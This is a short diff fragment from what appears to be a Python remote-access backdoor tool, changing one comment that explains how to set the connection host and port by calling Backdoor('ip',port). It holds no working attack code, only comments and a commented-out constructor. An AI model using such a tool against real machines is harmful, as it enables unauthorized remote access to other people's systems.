@@ -20,7 +20,7 @@ class Backdoor:
     def __init__(self):
         # Font: Chuncky
 
-        # OBS: FOR DIRECT CONNECTION USE THIS FUNCTION BELOW
+        # OBS: FOR DIRECT CONNECTION USE THIS FUNCTION BELOW AND DOWN IN THE CODE PUT Backdoor("ip",port)
 
         # def __init__(self,host,port):
             # self.host = str(host)
